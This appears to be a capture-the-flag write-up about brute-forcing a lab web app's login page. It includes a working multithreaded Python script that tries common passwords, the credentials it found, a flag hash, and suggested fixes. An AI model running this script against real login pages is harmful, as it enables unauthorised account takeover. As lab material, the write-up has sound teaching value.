# Brute force login

### Breach description

Brute forcing the login page with a script testing common passwords ends up working with a pair root/shadow

```python
import requests
import concurrent.futures

# URL of the login page
login_url = "http://192.168.64.6/?page=signin"

# Shared variable to indicate successful login
success = False

# Define a function to perform the login attempt
def brute_force_login(username, password):
    global success
    
    if success:
        return  # If success is already True, skip the login attempt
    
    # Create a session
    session = requests.Session()
    
    # Prepare the login data
    login_data = {
        "username": username,
        "password": password,
        "Login": "Login"
    }
    
    # Send the login request
    response = session.get(login_url, params=login_data)
    
    # Check if login was successful
    if "flag" in response.text:
        print(f"Login successful with credentials: {username}/{password}")
        success = True

# Define the path to the common passwords file
passwords_file = "common_passwords.txt"

# Read passwords from the file
with open(passwords_file, "r") as file:
    passwords = file.read().splitlines()

# Define a list of usernames to try
usernames = ["root", "admin", "user", "test"]

# Define the maximum number of concurrent requests
max_workers = 20

# Create a ThreadPoolExecutor
with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
    # Submit login attempts
    futures = [executor.submit(brute_force_login, username, password) for username in usernames for password in passwords]
    
    # Wait for any login attempt to succeed
    concurrent.futures.wait(futures, return_when=concurrent.futures.FIRST_COMPLETED)
```

Common passwords [list](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt) used.

**The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2**

### Explanation of the breach

Programmatically trying multiple combinations of a login/password pair. Can a computationnally consuming task. Hopefully most passwords are common ones. Using passwords lists can speed up the process.

### Breach Fix

Put a maximum retry number to 3 or 4 for a given login. Implement a 2FA mecanism.

On the user side, use a passwords manager and auto generate a different password for each website where you have credentials.
